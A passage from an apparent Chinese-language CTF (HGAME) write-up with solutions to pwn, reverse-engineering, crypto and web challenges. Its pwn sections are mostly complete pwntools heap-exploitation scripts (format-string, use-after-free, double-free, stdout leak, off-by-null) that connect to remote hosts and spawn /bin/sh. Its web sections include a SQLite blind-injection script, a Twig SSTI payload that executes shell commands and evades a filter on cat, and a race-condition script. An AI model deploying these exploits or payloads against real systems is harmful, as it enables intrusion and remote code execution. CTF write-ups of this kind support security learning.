= ELF(\u0026#34;./libc-2.31.so\u0026#34;) def echo(length, content): p.sendlineafter(b\u0026#34;your content\u0026#39;s length:\u0026#34;, str(length)) p.send(content) def proof(y): may = string.ascii_letters+string.digits for i in may: for j in may: for k in may: for l in may: res = i +j +k +l if hashlib.sha256((res).encode()).hexdigest() == y: p.sendline(res) return print(\u0026#39;Wrong!\u0026#39;) p.recvuntil(b\u0026#34; == \u0026#34;) a = p.recvuntil(b\u0026#34;\\n\u0026#34;)[:-1].decode() print(a) proof(a) echo(0x450, b\u0026#34;%3$pzz\u0026#34;) p.recvuntil(\u0026#34;\\n\u0026gt;\u0026gt; \u0026#34;) libc.address = int(p.recvuntil(\u0026#34;zz\u0026#34;)[:-2].decode(), 16) + 895550 - 0x10 - libc.sym[\u0026#34;__malloc_hook\u0026#34;] echo(0x450, b\u0026#34;%6$pzz\u0026#34;) p.recvuntil(\u0026#34;\\n\u0026gt;\u0026gt; \u0026#34;) heap_0 = int(p.recvuntil(\u0026#34;zz\u0026#34;)[:-2].decode(), 16) - 0x10 echo(0x450, b\u0026#34;%4$pzz\u0026#34;) p.recvuntil(\u0026#34;\\n\u0026gt;\u0026gt; \u0026#34;) heap_fastbins = int(p.recvuntil(\u0026#34;zz\u0026#34;)[:-2].decode(), 16) print(hex(libc.address)) print(hex(heap_0)) print(hex(heap_0 \u0026amp; 0xff)) print(hex(heap_fastbins)) echo(0x450, b\u0026#34;aaa\u0026#34;) echo(0x3e0, b\u0026#34;aaa\u0026#34;) echo(0x370, b\u0026#34;aaa\u0026#34;) echo(0x300, b\u0026#34;aaa\u0026#34;) echo(0x290, b\u0026#34;aaa\u0026#34;) echo(0x220, b\u0026#34;aaa\u0026#34;) echo(0x1b0, b\u0026#34;aaa\u0026#34;) echo(0x140, b\u0026#34;aaa\u0026#34;) echo(0xd0, b\u0026#34;aaa\u0026#34;) echo(0x60, b\u0026#34;aaa\u0026#34;) echo(0x60, b\u0026#34;%\u0026#34; + str(heap_0 \u0026amp; 0xff).encode() + b\u0026#34;c%6$hhn\u0026#34;) echo(0x60, b\u0026#34;%\u0026#34; + str((heap_fastbins + 0xe0) \u0026amp; 0xffff).encode() + b\u0026#34;c%10$hn\u0026#34;) echo(0x60, p64(libc.sym[\u0026#34;__free_hook\u0026#34;])) echo(0, b\u0026#34;\u0026#34;) echo(0x60, b\u0026#34;aaa\u0026#34;) echo(0x60, b\u0026#34;%10$ln\u0026#34;) echo(0x60, b\u0026#34;aaa\u0026#34;) echo(0x60, b\u0026#34;%10$ln\u0026#34;) echo(0x60, b\u0026#34;aaa\u0026#34;) echo(0x60, b\u0026#34;%10$ln\u0026#34;) echo(0x60, b\u0026#34;aaa\u0026#34;) echo(0x60, b\u0026#34;%10$ln\u0026#34;) echo(0x60, b\u0026#34;aaa\u0026#34;) echo(0x60, b\u0026#34;%10$ln\u0026#34;) echo(0x60, b\u0026#34;aaa\u0026#34;) echo(0x60, b\u0026#34;%10$ln\u0026#34;) echo(0x60, b\u0026#34;aaa\u0026#34;) echo(0x60, b\u0026#34;%10$ln\u0026#34;) echo(0x60, b\u0026#34;%10$ln\\x00\\x00\u0026#34; + p64(0)*2 + p64(0x51)) echo(0x60, b\u0026#34;%96c%10$hhn\u0026#34; + b\u0026#34;\\x00\u0026#34;*5 + p64(0)*7 + p64(0x41)) echo(0x30, p64(0)*3 + p64(0x71) + p64(libc.sym[\u0026#34;__realloc_hook\u0026#34;] - 27)) echo(0x30, b\u0026#34;%10$ln\u0026#34;) echo(0x60, b\u0026#34;aaa\u0026#34;) echo(0x60, b\u0026#34;%10$ln\u0026#34;) # gdb.attach(p, \u0026#34;b *$rebase(0x129F)\u0026#34;) echo(0x60, b\u0026#34;%10$ln\u0026#34; + b\u0026#34;\\x00\u0026#34;*5 + p64(0)*2 + p64(0) + p64(libc.address + 0xe6c81)) # echo(0x0, b\u0026#34;\u0026#34;) echo(0x0, b\u0026#34;aaa\u0026#34;) # %224c%4$hhn p.interactive() # 0xe6c7e execve(\u0026#34;/bin/sh\u0026#34;, r15, r12) # constraints: # [r15] == NULL || r15 == NULL # [r12] == NULL || r12 == NULL # 0xe6c81 execve(\u0026#34;/bin/sh\u0026#34;, r15, rdx) # constraints: # [r15] == NULL || r15 == NULL # [rdx] == NULL || rdx == NULL # 0xe6c84 execve(\u0026#34;/bin/sh\u0026#34;, rsi, rdx) # constraints: # [rsi] == NULL || rsi == NULL # [rdx] == NULL || rdx == NULL [Pwn]oldfashion_note  By triplewings\n uaf 2.31 打 fastbins\nfrom pwn import * context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;, log_level=\u0026#39;debug\u0026#39;) p = process(\u0026#34;./note\u0026#34;) p = remote(\u0026#34;chuj.top\u0026#34;, 51445) libc = ELF(\u0026#34;./libc-2.31.so\u0026#34;) def proof(y): may = string.ascii_letters+string.digits for i in may: for j in may: for k in may: for l in may: res = i +j +k +l if hashlib.sha256((res).encode()).hexdigest() == y: p.sendline(res) return print(\u0026#39;Wrong!\u0026#39;) p.recvuntil(b\u0026#34; == \u0026#34;) a = p.recvuntil(b\u0026#34;\\n\u0026#34;)[:-1].decode() print(a) proof(a) def menu(i): p.sendlineafter(b\u0026#34;farewell\u0026#34;, str(i)) def add(idx, size, content): menu(1) p.sendlineafter(b\u0026#34;index?\u0026#34;, str(idx)) p.sendlineafter(b\u0026#34;size?\u0026#34;, str(size)) p.sendafter(b\u0026#34;content?\u0026#34;, content) def show(idx): menu(2) p.sendlineafter(b\u0026#34;index?\u0026#34;, str(idx)) def free(idx): menu(3) p.sendlineafter(b\u0026#34;index?\u0026#34;, str(idx)) for i in range(8): add(i, 0x80, b\u0026#34;aaa\u0026#34;) for i in range(7): free(7-i) free(0) show(0) libc.address = u64(p.recvuntil(b\u0026#34;\\x7f\u0026#34;)[-6:].ljust(8, b\u0026#34;\\x00\u0026#34;)) - 96 - 0x10 - libc.sym[\u0026#34;__malloc_hook\u0026#34;] print(hex(libc.address)) for i in range(8): add(i, 0x80, b\u0026#34;bbb\u0026#34;) for i in range(9): add(i, 0x20, b\u0026#34;ccc\u0026#34;) for i in range(8): free(8-i) free(0) free(1) for i in range(2, 9): add(i, 0x20, b\u0026#34;ddd\u0026#34;) add(1, 0x20, p64(libc.sym[\u0026#34;__free_hook\u0026#34;])) add(0, 0x20, b\u0026#34;/bin/sh\\x00\u0026#34;) add(1, 0x20, b\u0026#34;eee\u0026#34;) add(2, 0x20, p64(libc.sym[\u0026#34;system\u0026#34;])) free(0) p.interactive() [RE]xD MAZE  By s0uthwood\n 一维的迷宫，直接用 vscode 的小技巧转成 flag\n选中 512 个 # 和后面的一个空格，然后 CTRL+SHIFT+L 全选，换成 3，以此类推\n[RE]fakeshell  By oneQuiz\n 理解了题意后我们直奔验证 sudo 密码的函数，发现是以 aHappyhg4me 指向的字符串为秘钥的 RC4 加密算法，\n\r\n\r\n但是直接用 aHappyhg4me 指向的字符串解密只有乱码。\n\r\n\r\n之后我就卡住了，看了 WP 才知道原来在 c 语言中，被 __attribute__((constructor)) 分配属性的函数会先于 main() 函数被调用，IDA 将其反编译到 init 中。不过我直接看也看 init 我也看不出来什么不对劲，只是能看出它好像是调用了其他函数的指针。\n\r\n不过我们只要在 aHappyhg4me 处按下 X 查看其被交叉引用的记录，就可以较容易地发现明显这个字符串是被修改过的。\n\r\n双击 mov 指令，成功找到修改秘钥字符串的函数。\n\r\n解密得到flag。\n\r\n关于 __attribute__：\n__attribute__可用于为函数或者数据声明赋属性值。给函数分配属性的主要目的是为了让编译程序可以优化处理。分配给函数的属性位于函数原型的声明中。\n __attribute__((constructor)) 先于main()函数调用； __attribute__((destructor))在main()函数后调用。  #include \u0026lt;stdio.h\u0026gt;#include \u0026lt;stdlib.h\u0026gt; static void before(void) __attribute__((constructor)); static void after(void) __attribute__((destructor)); static void before() { printf(\u0026#34;before main\\n\u0026#34;); } static void after(void) { printf(\u0026#34;after main\\n\u0026#34;); } int main() { printf(\u0026#34;main\\n\u0026#34;); return 0; } \r\n还可以通过参数设置优先级关系：\n#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;stdlib.h\u0026gt; static void before(void) __attribute__((constructor)); static void before3(void) __attribute__((constructor(103))); static void before2(void) __attribute__((constructor(102))); static void before1(void) __attribute__((constructor(101))); static void before2() { printf(\u0026#34;before 102\\n\u0026#34;); } static void before1() { printf(\u0026#34;before 101\\n\u0026#34;); } static void before3() { printf(\u0026#34;before 103\\n\u0026#34;); } static void before() { printf(\u0026#34;before main\\n\u0026#34;); } int main() { printf(\u0026#34;main\\n\u0026#34;); return 0; } \r\n[RE]creakme2  By s0uthwood\n 在加密函数里看一下汇编，发现用了 try except 来构造了一个除 0 异常，当最高位为 0 时，异或一个 0x1234567\n#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;stdint.h\u0026gt; void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) { unsigned int i; uint32_t v0=v[0], v1=v[1], sum=0, delta=0x9E3779B1; for (i=0; i \u0026lt; num_rounds; i++) { v0 += (((v1 \u0026lt;\u0026lt; 4) ^ (v1 \u0026gt;\u0026gt; 5)) + v1) ^ (sum + key[sum \u0026amp; 3]); sum += delta; if (sum \u0026gt;\u0026gt; 31 == 0) sum ^= 0x1234567; printf(\u0026#34;%x\\n\u0026#34;, sum); v1 += (((v0 \u0026lt;\u0026lt; 4) ^ (v0 \u0026gt;\u0026gt; 5)) + v0) ^ (sum + key[(sum\u0026gt;\u0026gt;11) \u0026amp; 3]); } v[0]=v0; v[1]=v1; printf(\u0026#34;%x\\n\u0026#34;, sum); } void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) { unsigned int i; uint32_t v0=v[0], v1=v[1], delta=0x9E3779B1, sum=0xc78e4d05; for (i=0; i \u0026lt; num_rounds; i++) { v1 -= (((v0 \u0026lt;\u0026lt; 4) ^ (v0 \u0026gt;\u0026gt; 5)) + v0) ^ (sum + key[(sum\u0026gt;\u0026gt;11) \u0026amp; 3]); if (sum \u0026gt;\u0026gt; 31 == 0) sum ^= 0x1234567; sum -= delta; printf(\u0026#34;%x\\n\u0026#34;, sum); v0 -= (((v1 \u0026lt;\u0026lt; 4) ^ (v1 \u0026gt;\u0026gt; 5)) + v1) ^ (sum + key[sum \u0026amp; 3]); } v[0]=v0; v[1]=v1; } int main() { uint32_t v[]={0x457E62CF, 0x9537896C, 0x1F7E7F72, 0xF7A073D8, 0x8E996868, 0x40AFAF99, 0xF990E34, 0x196F4086}; uint32_t const k[4]={1,2,3,4}; unsigned int r=32; decipher(r, v, k); decipher(r, v + 2, k); decipher(r, v + 4, k); decipher(r, v + 6, k); printf(\u0026#34;%s\\n\u0026#34;,v); return 0; } [RE]upx magic 0  By oneQuiz\n 听说是放错附件了所以这个并没有 UPX 壳。。。\nIDA 打开搜索字符串进入验证函数：\n\r\n顺了一遍发现这个加密是单向的，然后卡住（我太笨了T-T）\n经过提醒发现可以直接用 ascii 码可见位直接爆破。\n#include \u0026lt;stdio.h\u0026gt;unsigned short ans[33]; char flag[33]; int main() { ans[0] = 36200; ans[1] = 40265; ans[2] = 10770; ans[3] = 43802; ans[4] = 52188; ans[5] = 47403; ans[6] = 11826; ans[7] = 40793; ans[8] = 56781; ans[9] = 40265; ans[10] = 43274; ans[11] = 3696; ans[12] = 62927; ans[13] = 2640; ans[14] = 23285; ans[15] = 65439; ans[16] = 40793; ans[17] = 48395; ans[18] = 22757; ans[19] = 14371; ans[20] = 48923; ans[21] = 30887; ans[22] = 43802; ans[23] = 18628; ans[24] = 43274; ans[25] = 11298; ans[26] = 40793; ans[27] = 23749; ans[28] = 24277; ans[29] = 30887; ans[30] = 9842; ans[31] = 22165; int rot = 0; unsigned short rot1 = 0; char c = 0; for (int i = 0; i \u0026lt; 32; i++) { for (flag[i] = 33; flag[i] \u0026lt; 127; flag[i]++) { c = flag[i]; rot = flag[i] \u0026lt;\u0026lt; 8; for (int j = 0; j \u0026lt; 8; j++) { if ((rot \u0026amp; 0x8000) == 0) rot *= 2; else rot = (rot * 2) ^ 0x1021; } rot1 = (unsigned __int16)rot; if (rot1 == ans[i]) { printf(\u0026#34;%c\u0026#34;, c); } } } } 直接运行就可以出 flag 啦。\n后来才发现这个根本不是什么加密算法，就是上学期我刚学过的 CRC-16 校验码，这种都是直接爆破就行了。\n CRC16的算法原理：\n 根据CRC16的标准选择初值 CRCIn 的值； 将数据的第一个字节与 CRCIn 高 8 位异或； 判断最高位，若该位为 0 左移一位，若为 1 左移一位再与多项式 Hex 码异或； 重复 3 直至 8 位全部移位计算结束； 重复将所有输入数据操作完成以上步骤，所得 16 位数即 16 位 CRC 校验码。  CRC16_CCITT：\n多项式 $x^{16} + x^{12}+ x^5+1（0x1021）$，初始值 $0x0000$，低位在前，高位在后，结果与 $0x0000$ 异或；\n [RE]upx magic 1  By s0uthwood\n 发现没法自动脱壳，010 打开之后，手动把三个 UPX? 改成 UPX!，之后就能自动脱壳了\n[Crypto]Chinese Character Encryption  By NULLPointer\n 脑洞题。\n解压后得到 flag.enc，用记事本打开发现是许多汉字字符串，因此猜想是否与汉字在 Unicode 中的编码有关，尝试破解失败。题目中提示 flag.enc 中每一行均是 flag 的加密，说明每一行汉字都是 flag。发现相同的字母在加密后得到了不同的汉字，这说明每一行相同位置出现的不同的汉字在某些方面具有共同点。\n题目提示该题的加密方式只与汉字的拼音有关，因此使用 pypinyin 包解出拼音，发现每一行相同位置的汉字的拼音高度重合。联想到拼音的数字表达形式（按照声调一二三四标在拼音后加上 1234，轻声按 0 处理），猜想将拼音字母的 ASCII 码加和再加上声调代表的数字的 ASCII 码（轻声加 48，一声加 49，二声加 50，以此类推）作为汉字的编码，即 pypinyin 包中的 Style.TONE3 风格解出的字符串 ASCII 之和。操作发现部分汉字编码相同，说明猜想合理。\n尝试对编码进行操作，发现对 128 取模后开始几个汉字的 ASCII 码对应 hgame，解密即可：\nimport pypinyin def decrypt(s): flag = \u0026#34;\u0026#34; for c in s: ASCII_sum = 0 k = pypinyin.pinyin(c,style = pypinyin.Style.TONE3)[0][0] for i in k: ASCII_sum += ord(i) flag += chr(ASCII_sum % 128) return flag message = \u0026#34;陉萏俦蘭貑謠祥冄剏髯簧凰蕆秉僦笆鼣雔耿睺渺仦殣櫤鄽偟壮褃劳充迧蝔镁樷萾懴雈踺猳钔緲螩蝒醢徣纒漐\u0026#34; print(decrypt(message)) # \u0026#34;hgame{It*sEEMS|thaT~YOu=LEArn@PinYiN^VerY-WelL}\u0026#34; [Crypto]RSA Attack [Crypto]RSA Attack 2 [Crypto]The Password Plus Pro Max Ultra  By NULLPointer\n 解压得到output.txt和task.py，先分析加密代码如下。\ndef move(n, k): s = bin(n)[2:].zfill(64) # 将n转为64位二进制的形式 k = k \u0026amp; 63 return int(s[k:] + s[:k], 2) # 循环左移k位 def encrypt(x, ks): return xor(x, reduce(xor, map(lambda k: move(x, k), ks))) # 设ks中的数为a1,a2,..,an,返回x^(x\u0026lt;\u0026lt;\u0026lt;a1)^(x\u0026lt;\u0026lt;\u0026lt;a2)^...^(x\u0026lt;\u0026lt;\u0026lt;an) xs = list(map(s2n, findall(r\u0026#34;.{1,8}\u0026#34;, flag))) # 将flag每八个字符分成一组得到多组字符串，转成整数放入xs for i in range(len(xs)): ks = sample(range(1, 64), (i + 1) * 2) # 对于xs中第i个数，在1到64的范围内随机选取(i + 1) * 2个数，放入ks y = encrypt(xs[i], ks) # 利用ks加密xs中的每个数字 assert xs[i] == decrypt(y, ks) print(y, sorted(ks)) # 输出y和ks 发现本题实际上使用的是循环移位-异或加密。output.txt 中每一行前面的数字是加密得到的结果，后面的列表是加密过程中异或式每一项循环左移的位数。\n对于固定位数 m 的二进制串，循环移位-异或加密算法相当于在系数取自 GF(2) 的条件下对二进制多项式做左乘及加和处理，只不过在每次处理之后均要对 m 次多项式求模。因此，对于一个 m 位的二进制串，执行 m 次循环移位-异或算法后将回到其本身。这个性质说明只需将本题中给出的一次加密结果利用移位数列表再加密 63 次即可还原出明文。解密代码如下：\ndef move(n, k): s = bin(n)[2:].zfill(64) k = k \u0026amp; 63 return int(s[k:] + s[:k], 2) def encrypt(x, ks): return xor(x, reduce(xor, map(lambda k: move(x, k), ks))) def decrypt(m,l): flag = \u0026#34;\u0026#34; for i in range(len(m)): for j in range(63): m[i] = encrypt(m[i],l[i]) flag += str(n2s(m[i])) flag = flag.replace(\u0026#34;\u0026#39;b\u0026#39;\u0026#34;,\u0026#39;\u0026#39;) return flag m = [2656224875120172108,1261711348908201279,18219282869614004824,15279054981769814589,7966355346882200701,5641592208539483808,1502927090219059154 ,3996223120734273799,18295033054788808618,18126228466291248047,9413762634844369954 ,8964324149921197550,6962485320551449848] l = [[8, 35],[19, 29, 30, 45],[6, 16, 18, 21, 44, 55],[10, 26, 30, 46, 51, 54, 58, 63],[5, 13, 25, 29, 37, 39, 43, 52, 53, 59],[1, 26, 31, 39, 40, 41, 43, 45, 49, 52, 54, 62],[8, 12, 19, 20, 30, 32, 34, 40, 41, 45, 46, 49, 55, 58],[2, 3, 5, 6, 8, 10, 15, 19, 26, 27, 33, 40, 42, 47, 52, 61],[1, 16, 17, 27, 28, 30, 32, 36, 37, 38, 39, 48, 49, 51, 55, 57, 59, 62],[5, 11, 12, 20, 22, 23, 25, 27, 31, 32, 33, 37, 44, 45, 49, 52, 53, 59, 61, 62],[2, 7, 10, 12, 18, 19, 20, 22, 26, 29, 33, 34, 38, 40, 41, 45, 46, 51, 54, 56, 57, 60],[3, 4, 5, 9, 12, 13, 18, 19, 21, 23, 24, 25, 30, 33, 34, 35, 37, 39, 43, 44, 46, 49, 50, 53],[1, 3, 6, 7, 10, 11, 13, 14, 23, 27, 32, 33, 35, 37, 39, 41, 46, 48, 49, 50, 51, 53, 54, 56, 58, 62]] print(decrypt(m,l)) #\u0026#34;hgame{XOr|RoR\u0026amp;rOl|Is+vERY#coMmon*BiTwisE$OPeraTiOn*IT@is%oFten,ENCOUntErED*in.syMMeTRic?encryPtION}\u0026#34; week3 [Web]LoginMe  By SSGSS\n hint 里给了部分查询语句，通过 ') or (' 左右闭合后中间能进行布尔盲注，尝试用 left, ascii 等函数均未返回预期结果，故不是 mysql 数据库，经验证为 sqlite 注入。\nimport requests import json url = \u0026#39;http://f4440d8510.login.summ3r.top:60067/login\u0026#39; ans = \u0026#39;\u0026#39; header = { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39; } # sql = \u0026#39;select group_concat(sql) from sqlite_master\u0026#39; sql = \u0026#39;select group_concat(password) from uuussseeerrrsss limit 0, 1\u0026#39; for i in range(1, 1000): L = 32 R = 127 while R - L \u0026gt; 1: mid = (L + R) \u0026gt;\u0026gt; 1 payload = { \u0026#34;username\u0026#34;: \u0026#34;ass\u0026#39;) or substr((%s), %d, 1) \u0026lt; \u0026#39;%c\u0026#39; or (username=\u0026#39;test1\u0026#34; % (sql, i, chr(mid)), \u0026#34;password\u0026#34;: \u0026#34;114514\u0026#34; } r = requests.post(url, headers=header, data=json.dumps(payload)) if \u0026#39;success\u0026#39; in r.text: R = mid else: L = mid ans += chr(L) print(ans) \u0026#39;\u0026#39;\u0026#39; CREATE TABLE `uuussseeerrrsss` ( `id` integer, `created_at` datetime, `updated_at` datetime, `deleted_at` datetime, `username` text UNIQUE, `password` text, PRIMARY KEY (`id`) ),CREATE INDEX `idx_uuussseeerrrsss_deleted_at` ON `uuussseeerrrsss`(`deleted_at`) \u0026#39;\u0026#39;\u0026#39; [Web]SecurityCenter  By SSGSS\n 查看 hint，该项目装了如下三个包：\nsymfony/polyfill-ctype v1.24.0\rsymfony/polyfill-mbstring v1.24.0\rtwig/twig v3.3.7\r依次搜索，twig 在 18 年爆出了一个 SSTI 的洞，于是在 url 处找到注入点：[146.56.223.34:60036/redirect.php?url={{1*7}}](http://146.56.223.34:60036/redirect.php?url={{1*7}})\n随手找了个 TWIG3.X 的 payload，{{[\u0026quot;id\u0026quot;, 0\\]|sort(\u0026quot;system\u0026quot;)|join(\u0026quot;,\u0026quot;)}}\n成功 rce，但是读 flag 的时候 cat 被 waf，用 head 去绕，正则匹配了 hgame 内容，base64 一下即可。\n最终payload：\nhttp://146.56.223.34:60036/redirect.php?url={{[\u0026quot;head /flag|base64\u0026quot;, 0]|sort(\u0026quot;system\u0026quot;)|join(\u0026quot;,\u0026quot;)}})\n[Web]Vidar shop demo  By SSGSS\n 条件竞争，抢占的资源是钱，可以先狂发 300 个 40 块的订单的包，然后开多线程分别去支付这些包，如果条件竞争顺利的话应该来不及太扣钱，然后我们就分别对这些订单退款钱就够了。\nimport requests import json import threading url = \u0026#39;http://559e013ac8.vidar-shop.mjclouds.com/api/pay/create\u0026#39; payload = {\u0026#34;uid\u0026#34;: 315, \u0026#34;amount\u0026#34;: 20} header = { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39;, \u0026#39;Authorization\u0026#39;: \u0026#39;bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NDQxMzgxNjUsImlhdCI6MTY0NDA1MTc2NSwidWlkIjozMTV9.QyUNGJRUDQ4qp13utRgTWV8jDs4UhQYWOX8BP6wWcng\u0026#39; } def buy(id): payload[\u0026#34;oid\u0026#34;] = id requests.post(url, headers=header, data=json.dumps(payload)) ts = [] for i in range(5603, 5855): exec(\u0026#39;t{0}= threading.Thread(target=buy,args=(i,))\u0026#39;.format(i)) exec(\u0026#39;ts.append(t{0})\u0026#39;.format(i)) for s in ts: s.start() print(\u0026#34;DONE\u0026#34;) [Pwn]elder_note  By triplewings\n double free 写 malloc_hook, double_free 报错拿 shell\nfrom pwn import * context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;, log_level=\u0026#39;debug\u0026#39;) p = process(\u0026#34;./note\u0026#34;) p = remote(\u0026#34;chuj.top\u0026#34;, 52620) libc = ELF(\u0026#34;./libc-2.23.so\u0026#34;) def proof(y): may = string.ascii_letters+string.digits for i in may: for j in may: for k in may: for l in may: res = i +j +k +l if hashlib.sha256((res).encode()).hexdigest() == y: p.sendline(res) return print(\u0026#39;Wrong!\u0026#39;) p.recvuntil(b\u0026#34; == \u0026#34;) a = p.recvuntil(b\u0026#34;\\n\u0026#34;)[:-1].decode() print(a) proof(a) def menu(i): p.sendlineafter(b\u0026#34;4. farewell\u0026#34;, str(i)) def add(idx, size, content): menu(1) p.sendlineafter(b\u0026#34;index?\u0026#34;, str(idx)) p.sendlineafter(b\u0026#34;size?\u0026#34;, str(size)) p.sendafter(b\u0026#34;content?\u0026#34;, content) def show(idx): menu(2) p.sendlineafter(b\u0026#34;index?\u0026#34;, str(idx)) def free(idx): menu(3) p.sendlineafter(b\u0026#34;index?\u0026#34;, str(idx)) add(0, 0x80, b\u0026#34;aaa\u0026#34;) add(1, 0x80, b\u0026#34;aaa\u0026#34;) free(0) show(0) p.recvuntil(\u0026#34;\u0026#34;) libc.address = u64(p.recvuntil(b\u0026#34;\\x7f\u0026#34;)[-6:].ljust(8, b\u0026#34;\\x00\u0026#34;)) - 88 - 0x10 - libc.sym[\u0026#34;__malloc_hook\u0026#34;] add(0, 0x80, b\u0026#34;aaa\u0026#34;) add(0, 0x60, b\u0026#34;aaa\u0026#34;) add(1, 0x60, b\u0026#34;aaa\u0026#34;) add(2, 0x60, b\u0026#34;/bin/sh\u0026#34;) free(0) free(1) free(0) add(0, 0x60, p64(libc.sym[\u0026#34;__malloc_hook\u0026#34;] - 0x23)) add(1, 0x60, b\u0026#34;aaa\u0026#34;) add(3, 0x60, b\u0026#34;aaa\u0026#34;) # gdb.attach(p, \u0026#34;b add_note\u0026#34;) print(hex(libc.address)) add(4, 0x60, b\u0026#34;aaa\u0026#34; + p64(0)*2 + p64(libc.address + 0xf03a4) + p64(0)) free(0) free(0) # free(2) p.interactive() # 0x45226 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x30, environ) # constraints: # rax == NULL # 0x4527a execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x30, environ) # constraints: # [rsp+0x30] == NULL # 0xf03a4 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x50, environ) # constraints: # [rsp+0x50] == NULL # 0xf1247 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x70, environ) # constraints: # [rsp+0x70] == NULL [Pwn]changeable_note  By triplewings\n 2.23 打 stdout\nfrom pwn import * context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;, log_level=\u0026#39;debug\u0026#39;) p = process(\u0026#34;./note\u0026#34;) p = remote(\u0026#34;chuj.top\u0026#34;, 52401) libc = ELF(\u0026#34;./libc-2.23.so\u0026#34;) def proof(y): may = string.ascii_letters+string.digits for i in may: for j in may: for k in may: for l in may: res = i +j +k +l if hashlib.sha256((res).encode()).hexdigest() == y: p.sendline(res) return print(\u0026#39;Wrong!\u0026#39;) p.recvuntil(b\u0026#34; == \u0026#34;) a = p.recvuntil(b\u0026#34;\\n\u0026#34;)[:-1].decode() print(a) proof(a) def menu(i): p.sendlineafter(b\u0026#34;4. farewell\u0026#34;, str(i)) def add(idx, size, content): menu(1) p.sendlineafter(b\u0026#34;index?\u0026#34;, str(idx)) p.sendlineafter(b\u0026#34;size?\u0026#34;, str(size)) p.sendafter(b\u0026#34;content?\u0026#34;, content) def edit(idx, content): menu(2) p.sendlineafter(b\u0026#34;index?\\n\u0026gt;\u0026gt; \u0026#34;, str(idx)) p.sendline(content) def free(idx): menu(3) p.sendlineafter(b\u0026#34;index?\u0026#34;, str(idx)) add(0,0x30,b\u0026#34;aaa\u0026#34;) add(1,0x60,b\u0026#34;aaa\u0026#34;) add(2,0x60,p64(0)*5 + p64(0x41)) add(3,0x10,b\u0026#34;aaa\u0026#34;) add(4,0x10,b\u0026#34;aaa\u0026#34;) edit(1, p64(0)*9 + p64(0x21)) edit(0, p64(0)*7 + p64(0xe1)) free(1) free(2) add(5,0x40,b\u0026#34;aaa\u0026#34;) add(6,0x10,b\u0026#34;aaa\u0026#34;) add(7,0x20,b\u0026#34;\\xdd\\x25\u0026#34;) add(8,0x30,b\u0026#34;aaa\u0026#34;) edit(6, p64(0)*3 + b\u0026#34;\\x71\u0026#34;) add(9, 0x60, b\u0026#34;\\xdd\\x25\u0026#34;) add(10, 0x60, b\u0026#34;\\x00\u0026#34;*0x33 + p64(0xfbad1887) +p64(0)*3 + p8(0x88)) libc.address = u64(p.recvuntil(b\u0026#34;\\x7f\u0026#34;)[-6:].ljust(8, b\u0026#34;\\x00\u0026#34;)) - libc.sym[\u0026#39;_IO_2_1_stdin_\u0026#39;] print(hex(libc.address)) edit(0, p64(0)*7 + p64(0xe1)) free(9) free(5) add(5,0x40,b\u0026#34;aaa\u0026#34;) add(6,0x10,b\u0026#34;aaa\u0026#34;) add(7,0x20,p64(libc.sym[\u0026#34;__malloc_hook\u0026#34;] - 0x23)) add(8,0x30,b\u0026#34;aaa\u0026#34;) edit(6, p64(0)*3 + b\u0026#34;\\x71\u0026#34;) add(9, 0x60, b\u0026#34;aaa\u0026#34;) add(10, 0x60, b\u0026#34;\\x00\u0026#34;*3 + p64(0)*2 + p64(libc.address + 0xf03a4)) # gdb.attach(p, \u0026#34;b edit_note\u0026#34;) edit(6, p64(0)*3 + b\u0026#34;\\x41\u0026#34;) free(9) p.interactive() # 0x45226 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x30, environ) # constraints: # rax == NULL # 0x4527a execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x30, environ) # constraints: # [rsp+0x30] == NULL # 0xf03a4 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x50, environ) # constraints: # [rsp+0x50] == NULL # 0xf1247 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x70, environ) # constraints: # [rsp+0x70] == NULL [Pwn]sized_note  By triplewings\n off by null, unlink unsorted bins\nfrom pwn import * context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;, log_level=\u0026#39;debug\u0026#39;) p = process(\u0026#34;./note\u0026#34;) p = remote(\u0026#34;chuj.top\u0026#34;, 52966) libc = ELF(\u0026#34;./libc.so.6\u0026#34;) def proof(y): may = string.ascii_letters+string.digits for i in may: for j in may: for k in may: for l in may: res = i +j +k +l if hashlib.sha256((res).encode()).hexdigest() == y: p.sendline(res) return print(\u0026#39;Wrong!\u0026#39;) p.recvuntil(b\u0026#34; == \u0026#34;) a = p.recvuntil(b\u0026#34;\\n\u0026#34;)[:-1].decode() print(a) proof(a) def menu(i): p.sendlineafter(b\u0026#34;5. farewell\u0026#34;, str(i)) def add(idx, size, content): menu(1) p.sendlineafter(b\u0026#34;index?\u0026#34;, str(idx)) p.sendlineafter(b\u0026#34;size?\u0026#34;, str(size)) p.sendafter(b\u0026#34;content?\u0026#34;, content) def edit(idx, content): menu(4) p.sendlineafter(b\u0026#34;index?\\n\u0026gt;\u0026gt; \u0026#34;, str(idx)) p.send(content) def free(idx): menu(3) p.sendlineafter(b\u0026#34;index?\u0026#34;, str(idx)) def show(idx): menu(2) p.sendlineafter(b\u0026#34;index?\u0026#34;, str(idx)) add(0, 0xf8, b\u0026#34;aaa\u0026#34;) add(1, 0x88, b\u0026#34;aaa\u0026#34;) add(2, 0xf8, b\u0026#34;aaa\u0026#34;) add(3, 0x88, b\u0026#34;aaa\u0026#34;) for i in range(7): add(4+i, 0xf8, b\u0026#34;aaa\u0026#34;) for i in range(7): free(10 - i) free(1) free(0) add(1, 0x88, b\u0026#34;a\u0026#34;*0x80+p64(0x90+0x100)) free(2) for i in range(7): add(4+i, 0xf8,\u0026#34;/bin/sh\\x00\u0026#34;) add(0, 